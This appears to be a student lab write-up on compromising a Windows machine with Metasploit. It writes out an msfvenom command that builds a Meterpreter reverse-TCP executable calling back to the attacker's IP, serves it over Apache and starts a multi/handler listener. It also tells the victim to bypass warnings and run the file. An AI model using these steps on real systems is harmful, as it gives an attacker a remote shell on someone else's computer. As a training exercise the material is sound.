# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/user-attachments/assets/6305f05a-7760-46cc-86e0-a02b10489d73)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/user-attachments/assets/e6878cd8-282f-46db-89e8-36944721bad7)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/user-attachments/assets/116de4cc-d9ba-4b5a-99ec-da62e7705f77)

Start apache server sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/user-attachments/assets/a19784f1-a936-4564-905b-696a26f92904)

Check the status of apache2

## OUTPUT:

![image](https://github.com/user-attachments/assets/31b20403-1a34-422e-9c8b-204521d0ab2d)

Invoke msfconsole:
## OUTPUT:
![image](https://github.com/user-attachments/assets/a76d98f7-9e6e-426e-9e81-b6399d698f46)
![image](https://github.com/user-attachments/assets/47a8b14f-fa98-492e-9bda-3cefdfbe0f21)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/user-attachments/assets/1b05bcd6-b621-44df-b7d8-f89d13433da6)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## OUTPUT:
![image](https://github.com/user-attachments/assets/a01cffbc-6ec1-4eaa-8c7d-dcc54cf499bf)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/user-attachments/assets/e4ad8749-3d43-489d-a527-1acc52ce46e6)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
